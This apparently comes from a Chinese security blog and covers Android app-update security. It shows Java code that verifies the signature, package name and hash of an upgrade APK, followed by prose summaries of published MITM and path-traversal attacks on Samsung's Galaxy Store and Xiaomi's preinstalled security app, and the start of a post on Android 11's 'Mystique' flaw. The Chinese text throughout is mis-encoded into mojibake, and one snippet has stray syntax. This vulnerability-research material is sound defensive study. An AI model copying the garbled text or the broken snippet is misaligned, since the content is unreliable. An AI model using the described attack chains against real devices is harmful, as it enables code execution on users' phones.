description;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDescription</span><span class="params">(String description)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.description = description;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getDownUrl</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> downUrl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDownUrl</span><span class="params">(String downUrl)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.downUrl = downUrl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getVersion</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> version;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVersion</span><span class="params">(String version)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.version = version;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getHashcod</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> hashcod;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHashcod</span><span class="params">(String hashcod)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.hashcod = hashcod;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> key;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setKey</span><span class="params">(String key)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.key = key;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getIsForce</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> isForce;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsForce</span><span class="params">(String isForce)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.isForce = isForce;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯·æ±‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UpgradeModel</span>  <span class="variable">aResult</span> <span class="operator">=</span> xxxx<span class="comment">//è§£ææœåŠ¡å™¨è¿”å›çš„åæ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (aResult != <span class="literal">null</span> &amp;&amp; aResult.getData() != <span class="literal">null</span> ) &#123;        </span><br><span class="line">       <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> aResult.getData().getDownUrl(); </span><br><span class="line">       <span class="keyword">if</span> (url == <span class="literal">null</span> || !TextUtils.equals(url, <span class="string">&quot;è¿™é‡Œæ˜¯ä½ çŸ¥é“çš„ä¸‹è½½åœ°å€ï¼šä¹Ÿå¯ä»¥åªéªŒè¯hostUrl&quot;</span>)) &#123;</span><br><span class="line">              <span class="comment">// å¦‚æœç¬¦åˆï¼Œè¯´æ˜ä¸æ˜¯ç›®æ ‡ä¸‹è½½åœ°å€ï¼Œå°±ä¸å»ä¸‹è½½</span></span><br><span class="line"></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> DownUtils.getFile(url); <span class="comment">// ç›‘æµ‹æ˜¯å¦è¦é‡æ–°ä¸‹è½½</span></span><br><span class="line"><span class="keyword">if</span> (file.exists() &amp;&amp;   TextUtils.equals(aResult.getData().getHashCode(), EncryptUtils.Md5File(file))) </span><br><span class="line">  &amp;&amp; TextUtils.equals(aResult.getData().getKey(), DownLoadModel.getData().getKey()) &#123;/   </span><br><span class="line">       <span class="comment">// å¦‚æœç¬¦åˆï¼Œå°±å»å®‰è£… ä¸ç¬¦åˆé‡æ–°ä¸‹è½½ åˆ é™¤æ¶æ„æ–‡ä»¶</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®‰è£…</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** installApK</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> path</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">*/</span><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">installApK</span><span class="params">(Context context, <span class="keyword">final</span> String path, <span class="keyword">final</span> String name )</span> &#123;    </span><br><span class="line">       <span class="keyword">if</span> (!SafetyUtils.checkFile(path + name, context)) &#123;        </span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (!SafetyUtils.checkPagakgeName(context, path + name)) &#123;</span><br><span class="line">              Toast.makeText(context, <span class="string">&quot;å‡çº§åŒ…è¢«æ¶æ„è½¯ä»¶ç¯¡æ”¹ è¯·é‡æ–°å‡çº§ä¸‹è½½å®‰è£…&quot;</span>, Toast.LENGTH_SHORT ).show();</span><br><span class="line">              DLUtils.deleteFile(path + name);</span><br><span class="line">              ((Activity)context).finish();</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">switch</span> (SafetyUtils.checkPagakgeSign(context, path + name)) &#123;</span><br><span class="line">       <span class="keyword">case</span> SafetyUtils.SUCCESS:</span><br><span class="line">              DLUtils.openFile(path + name, context);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> SafetyUtils.SIGNATURES_INVALIDATE:</span><br><span class="line">              Toast.makeText(context, <span class="string">&quot;å‡çº§åŒ…å®‰å…¨æ ¡éªŒå¤±è´¥ è¯·é‡æ–°å‡çº§&quot;</span>, Toast.LENGTH_SHORT ).show();</span><br><span class="line">              ((Activity)context).finish();</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> SafetyUtils.VERIFY_SIGNATURES_FAIL:</span><br><span class="line">              Toast.makeText(context, <span class="string">&quot;å‡çº§åŒ…ä¸ºç›—ç‰ˆåº”ç”¨ è¯·é‡æ–°å‡çº§&quot;</span>, Toast.LENGTH_SHORT ).show();</span><br><span class="line">              ((Activity)context).finish();</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®‰å…¨æ ¡éªŒ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* å®‰å…¨æ ¡éªŒ</span></span><br><span class="line"><span class="comment">* Created by LIUYONGKUI on 2016-04-21.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafetyUtils</span> &#123;</span><br><span class="line">    <span class="comment">/** install sucess */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SUCCESS</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** SIGNATURES_INVALIDATE */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SIGNATURES_INVALIDATE</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** SIGNATURES_NOT_SAME */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">VERIFY_SIGNATURES_FAIL</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** is needcheck */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">NEED_VERIFY_CERT</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * checkPagakgeSigns.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">checkPagakgeSign</span><span class="params">(Context context, String srcPluginFile)</span> &#123;</span><br><span class="line">        <span class="type">PackageInfo</span> <span class="variable">PackageInfo</span> <span class="operator">=</span> context.getPackageManager()</span><br><span class="line">                                         .getPackageArchiveInfo(srcPluginFile, <span class="number">0</span>); <span class="comment">//Signature[] pluginSignatures = PackageInfo.signatures;</span></span><br><span class="line">        Signature[] pluginSignatures = PackageVerifyer.collectCertificates(srcPluginFile,</span><br><span class="line">                <span class="literal">false</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isDebugable</span> <span class="operator">=</span> (<span class="number">0</span> != (context.getApplicationInfo().flags &amp;</span><br><span class="line">            ApplicationInfo.FLAG_DEBUGGABLE));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pluginSignatures == <span class="literal">null</span>) &#123;</span><br><span class="line">            PaLog.e(<span class="string">&quot;ç­¾åéªŒè¯å¤±è´¥&quot;</span>, srcPluginFile);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">File</span>(srcPluginFile).delete();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> SIGNATURES_INVALIDATE;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (NEED_VERIFY_CERT &amp;&amp; !isDebugable) &#123; <span class="comment">//å¯é€‰æ­¥éª¤ï¼ŒéªŒè¯APKè¯ä¹¦æ˜¯å¦å’Œç°åœ¨ç¨‹åºè¯ä¹¦ç›¸åŒã€‚</span></span><br><span class="line"></span><br><span class="line">            Signature[] mainSignatures = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">PackageInfo</span> <span class="variable">pkgInfo</span> <span class="operator">=</span> context.getPackageManager()</span><br><span class="line">                                             .getPackageInfo(context.getPackageName(),</span><br><span class="line">                        PackageManager.GET_SIGNATURES);</span><br><span class="line">                mainSignatures = pkgInfo.signatures;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!PackageVerifyer.isSignaturesSame(mainSignatures,</span><br><span class="line">                        pluginSignatures)) &#123;</span><br><span class="line">                PaLog.e(<span class="string">&quot;å‡çº§åŒ…è¯ä¹¦å’Œæ—§ç‰ˆæœ¬è¯ä¹¦ä¸ä¸€è‡´&quot;</span>, srcPluginFile);</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">File</span>(srcPluginFile).delete();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> VERIFY_SIGNATURES_FAIL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * checkPagakgeName</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> srcNewFile</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkPagakgeName</span><span class="params">(Context context, String srcNewFile)</span> &#123;</span><br><span class="line">        <span class="type">PackageInfo</span> <span class="variable">packageInfo</span> <span class="operator">=</span> context.getPackageManager()</span><br><span class="line">                                         .getPackageArchiveInfo(srcNewFile,</span><br><span class="line">                PackageManager.GET_ACTIVITIES);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (packageInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> TextUtils.equals(context.getPackageName(),</span><br><span class="line">                packageInfo.packageName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * checkFile</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> aPath</span></span><br><span class="line"><span class="comment">    *            æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">    *            context</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkFile</span><span class="params">(String aPath, Context context)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">aFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(aPath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((aFile == <span class="literal">null</span>) || !aFile.exists()) &#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;å®‰è£…åŒ…å·²è¢«æ¶æ„è½¯ä»¶åˆ é™¤&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (context == <span class="literal">null</span>) &#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;å®‰è£…åŒ…å¼‚å¸¸&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="é¢å¤–çš„æ¼æ´"><a href="#é¢å¤–çš„æ¼æ´" class="headerlink" title="é¢å¤–çš„æ¼æ´"></a>é¢å¤–çš„æ¼æ´</h1><p>æ˜¯æ¼æ´ï¼Œä¹Ÿç®—æ˜¯ä¸å®‰å…¨çš„å¼€å‘æ–¹å¼å§ã€‚</p>
<h2 id="é€šè¿‡-MITM-çš„ä¸‰æ˜Ÿ-Galaxy-åº”ç”¨å•†åº—-RCE"><a href="#é€šè¿‡-MITM-çš„ä¸‰æ˜Ÿ-Galaxy-åº”ç”¨å•†åº—-RCE" class="headerlink" title="é€šè¿‡ MITM çš„ä¸‰æ˜Ÿ Galaxy åº”ç”¨å•†åº— RCE"></a>é€šè¿‡ MITM çš„ä¸‰æ˜Ÿ Galaxy åº”ç”¨å•†åº— RCE</h2><p>åŸæ–‡é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://www.adyta.pt/en/noticias/news-1/">https://www.adyta.pt/en/noticias/news-1/</a></p>
<h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>Galaxy Apps Store æ£€ç´¢ä¸€ä¸ªç‰¹å®šäºå›½å®¶&#x2F;åœ°åŒºçš„ URL ä»¥ä¾›å•†åº—ä½¿ç”¨ã€‚æ­¤è¯·æ±‚æœ‰æ—¶ä¼šå®šæœŸå‘ç”Ÿï¼Œæˆ–è€…åœ¨æ‚¨ç¬¬ä¸€æ¬¡å¯åŠ¨åº”ç”¨ç¨‹åºæ—¶æˆ–æ‚¨çš„ MCCï¼ˆç§»åŠ¨å›½å®¶ä»£ç ï¼‰å‘ç”Ÿå˜åŒ–æ—¶å‘ç”Ÿã€‚ä½†æ˜¯ï¼Œæ­¤è¯·æ±‚æ˜¯ä½¿ç”¨ HTTP è€Œä¸æ˜¯ HTTPS å‘å‡ºçš„ï¼Œè¿™å…è®¸ MITMï¼ˆä¸­é—´äººï¼‰æ”»å‡»ã€‚</p>
<p>åœ¨è¿™ä¸ª POST è¯·æ±‚ä¸­ï¼Œè®¾å¤‡å‘é€æœ‰å…³è®¾å¤‡çŠ¶æ€çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼šMCCã€MNCã€è®¾å¤‡å‹å·å’Œè¯­è¨€ã€‚åœ¨å“åº”ä¸­ï¼Œå°†è¿”å›ä¸€ä¸ªCountryURL ä»¥ä¾› Store ä½¿ç”¨ã€‚CountryURL åŒ…å« HTTP URLï¼Œä½†åº”ç”¨ç¨‹åºå°†åœ¨ä¸‹ä¸€ä¸ªè¯·æ±‚ä¸­ä½¿ç”¨ HTTPSã€‚</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image3.png" alt="image3"></p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image1.png" alt="image1"></p>
<p>ä¸­é—´äºº</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image4.png" alt="image4"></p>
<h2 id="å°ç±³é¢„è£…å®‰å…¨Appæ¼æ´"><a href="#å°ç±³é¢„è£…å®‰å…¨Appæ¼æ´" class="headerlink" title="å°ç±³é¢„è£…å®‰å…¨Appæ¼æ´"></a>å°ç±³é¢„è£…å®‰å…¨Appæ¼æ´</h2><p>åŸæ–‡é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://research.checkpoint.com/2019/vulnerability-in-xiaomi-pre-installed-security-app/">https://research.checkpoint.com/2019/vulnerability-in-xiaomi-pre-installed-security-app/</a></p>
<h3 id="1ã€Avastæ›´æ–°æ¼æ´"><a href="#1ã€Avastæ›´æ–°æ¼æ´" class="headerlink" title="1ã€Avastæ›´æ–°æ¼æ´"></a>1ã€Avastæ›´æ–°æ¼æ´</h3><p>å®‰å…¨APPä½¿ç”¨Avastã€AVL å’Œè…¾è®¯è¿›è¡Œæ€æ¯’ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå°† Avast è®¾ç½®ä¸ºåº”ç”¨ç¨‹åºçš„å®‰å…¨æ‰«æç¨‹åºï¼Œåº”ç”¨ç¨‹åºé€šè¿‡å°†<code>avast-android-vps-v4-release.apk</code> APK æ–‡ä»¶ä¸‹è½½åˆ° <code>Guard Provider</code> çš„ç§æœ‰ç›®å½•ï¼š<code>/data/data/com.miui.guardprovider/app_dex/vps_update*_&lt;timestamp&gt;*.apk</code> æ¥å®šæœŸæ›´æ–°å…¶ç—…æ¯’åº“ã€‚</p>
<p>ä½†æ˜¯ï¼Œæ›´æ–°æœºåˆ¶ä½¿ç”¨ä¸å®‰å…¨çš„ HTTP è¿æ¥æ¥ä¸‹è½½æ­¤æ–‡ä»¶ã€‚</p>
<h3 id="2ã€AVL-æ›´æ–°è·¯å¾„éå†æ¼æ´"><a href="#2ã€AVL-æ›´æ–°è·¯å¾„éå†æ¼æ´" class="headerlink" title="2ã€AVL æ›´æ–°è·¯å¾„éå†æ¼æ´"></a>2ã€AVL æ›´æ–°è·¯å¾„éå†æ¼æ´</h3><p>ä¸€æ—¦é˜»æ­¢ä¸AvastæœåŠ¡å™¨çš„è¿æ¥ï¼ŒAPPå°±ä¼šæŠŠé»˜è®¤çš„æ€æ¯’è½¯ä»¶æ¢æˆå¦ä¸€ä¸ªâ€“åœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯AVLåç—…æ¯’è½¯ä»¶ã€‚</p>
<p>åœ¨AVLæˆä¸ºé»˜è®¤æ€æ¯’è½¯ä»¶åï¼Œå®ƒå°†ç«‹å³ç”¨å…¶ç—…æ¯’æ•°æ®åº“æ›´æ–°è¯¥åº”ç”¨ã€‚å®ƒé€šè¿‡è¯·æ±‚ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼ˆå¦‚<a target="_blank" rel="noopener" href="https://update.avlyun.sec.miui.com/avl_antiy/miuistd/siglib/20180704.cj.conf%EF%BC%89%E6%9D%A5%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%96%B0%E7%9A%84%E7%97%85%E6%AF%92%E7%AD%BE%E5%90%8D%E3%80%82%E8%BF%99%E4%B8%AA%60.conf%60%E6%96%87%E4%BB%B6%E6%98%AF%E7%BA%AF%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F%E7%9A%84%EF%BC%8C%E8%A1%A8%E6%98%8E%E6%9C%89%E6%96%B0%E7%AD%BE%E5%90%8D%E7%9A%84ZIP%E6%A1%A3%E6%A1%88%E7%9A%84URL%E3%80%81%E5%A4%A7%E5%B0%8F%E5%92%8CMD5%E5%93%88%E5%B8%8C%E5%80%BC%E3%80%82">https://update.avlyun.sec.miui.com/avl_antiy/miuistd/siglib/20180704.cj.confï¼‰æ¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ–°çš„ç—…æ¯’ç­¾åã€‚è¿™ä¸ª`.conf`æ–‡ä»¶æ˜¯çº¯æ–‡æœ¬æ ¼å¼çš„ï¼Œè¡¨æ˜æœ‰æ–°ç­¾åçš„ZIPæ¡£æ¡ˆçš„URLã€å¤§å°å’ŒMD5å“ˆå¸Œå€¼ã€‚</a></p>
<p>åœ¨å¤„ç†å®Œé…ç½®æ–‡ä»¶åï¼ŒAVLä¼šä¸‹è½½<code>read_update_url</code>å­—æ®µä¸­æŒ‡ç¤ºçš„zipæ–‡ä»¶ï¼Œå¹¶å°†å…¶è§£å‹åˆ°Guard Providerç›®å½•ä¸­ã€‚</p>
<p>MITMæ”»å‡»è€…èƒ½å¤Ÿæ”¹å˜<code>.conf</code>æ–‡ä»¶çš„å†…å®¹ï¼Œå› ä¸ºå®ƒæ˜¯é€šè¿‡éå®‰å…¨è¿æ¥ä¸‹è½½çš„ï¼Œä½¿ç”¨<code>is_new=0</code>æ¥æ˜¾ç¤ºæ–°çš„æ›´æ–°çš„å­˜åœ¨ï¼Œå¹¶æä¾›URLé“¾æ¥åˆ°ä¸€ä¸ªç²¾å¿ƒåˆ¶ä½œçš„ZIPæ–‡ä»¶ã€‚</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/fig5.webp" alt="fig5"></p>
<p>AVL SDKè¿˜å­˜åœ¨è·¯å¾„ç©¿è¶Šæ¼æ´ï¼Œå› æ­¤ï¼Œæ”»å‡»è€…èƒ½å¤Ÿä½¿ç”¨ç²¾å¿ƒåˆ¶ä½œçš„zipæ–‡ä»¶æ¥è¦†ç›–åº”ç”¨ç¨‹åºæ²™ç›’ä¸­çš„ä»»ä½•æ–‡ä»¶ã€‚</p>
<p>å› æ­¤ï¼Œä¸€ä¸ªç²¾å¿ƒåˆ¶ä½œçš„APKï¼Œä½œä¸º<code>.../.../app_dex/vps_update_20190205-124933.apk</code>æ¡ç›®é™„åŠ åˆ°ZIPç­¾åçš„å­˜æ¡£ä¸­ï¼Œå°†æˆåŠŸè¦†ç›–ä¹‹å‰ä»Avastä¸‹è½½çš„æ›´æ–°ï¼Œå› ä¸ºä¸¤ä¸ªåç—…æ¯’SDKç»„ä»¶åœ¨ç›¸åŒçš„æ²™ç›’ä¸­ã€‚</p>
<p>ç„¶åé‡Šæ”¾Avastçš„é€šä¿¡ï¼Œå¹¶é˜»æ­¢AVLçš„é€šä¿¡ï¼Œç›´åˆ°APPå†æ¬¡é€‰æ‹©Avastä½œä¸ºæ´»åŠ¨çš„åç—…æ¯’è½¯ä»¶ã€‚ç”±äºGuard Providerå¯¹Avastæ›´æ–°çš„ç­¾åæ–‡ä»¶çš„æ ¡éªŒåªåœ¨ä¸‹è½½æ—¶è¿›è¡Œï¼Œåœ¨è¿è¡Œæ—¶å°±ä¸å†æ£€æŸ¥ï¼Œæ¶æ„APKå°†è¢«åŠ è½½æ‰§è¡Œã€‚</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-07-04T12:34:01.000Z" title="2022/7/4 20:34:01">2022-07-04</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-07-30T06:58:15.252Z" title="2022/7/30 14:58:15">2022-07-30</time></span><span class="level-item">24 minutes read (About 3542 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/">Android 11 é­”å½¢å¥³æ¼æ´</a></p><div class="content"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¯ä»¥å‚è€ƒäº¬ä¸œçš„<a target="_blank" rel="noopener" href="https://dawnslab.jd.com/mystique-paper/mystique-paper.pdf">ç™½çš®ä¹¦</a>ï¼Œæ¼æ´å€’æ˜¯ä¸éš¾ç†è§£ï¼Œæœ¬æ¥æ˜¯æƒ³å†™expçš„ï¼Œä½†æ˜¯æœ‰ç‚¹ç´¯ğŸ¥±ï¼Œæƒ³æƒ³è¿˜æ˜¯å…ˆæ•´ç†æ•´ç†æ–‡æ¡£ï¼Œæ‰¾æ‰¾æ„Ÿè§‰å§ã€‚</p>
